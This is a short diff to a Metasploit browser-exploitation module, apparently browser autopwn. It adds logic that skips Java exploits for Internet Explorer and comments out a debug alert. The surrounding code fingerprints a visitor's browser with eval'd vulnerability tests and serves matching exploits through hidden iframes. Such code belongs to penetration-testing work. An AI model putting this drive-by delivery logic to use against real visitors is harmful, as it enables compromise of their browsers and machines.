@@ -565,6 +565,12 @@ class Metasploit3 < Msf::Auxiliary
 					body << "<!--[if IE]>\n"
 				end
 				sploits.map do |s|
+
+					# Skip Java modules for IE browsers, since they will stop execution on the first attempt			
+					if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))
+						next if s[:name].index("java")
+					end
+			
 					body << (s[:prefix_html] || "") + "\n"
 					body << build_iframe(exploit_resource(s[:name])) + "\n"
 					body << (s[:postfix_html] || "") + "\n"
@@ -681,10 +687,13 @@ class Metasploit3 < Msf::Auxiliary
 					} else {
 						test = "try {" + test + "} catch (e) { is_vuln = false; }; is_vuln";
 					}
-					//alert("next_exploit(" + (exploit_idx).toString() + ") => " +
-					//	global_exploit_list[exploit_idx].resource + "\\n" +
-					//	test + " -- " + eval(test)
-					//);
+					
+					/*
+					alert("next_exploit(" + (exploit_idx).toString() + ") => " +
+						global_exploit_list[exploit_idx].resource + "\\n" +
+						test + " -- " + eval(test) );
+					*/
+					
 					if (eval(test)) {
 						write_iframe(global_exploit_list[exploit_idx].resource);
 						setTimeout("next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
@@ -724,6 +733,12 @@ class Metasploit3 < Msf::Auxiliary
 				func_name = "exploit#{browser.gsub(/[^a-zA-Z]/, '')}"
 				js << "function #{func_name}() { \n"
 				sploits.map do |s|
+					
+					# Skip Java modules for IE browsers, since they will stop execution on the first attempt			
+					if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))
+						next if s[:name].index("java")
+					end
+					
 					# get rid of newlines and escape quotes
 					test = s[:vuln_test].gsub("\n",'').gsub("'", "\\\\'")
 					# shouldn't be any in the resource, but just in case...
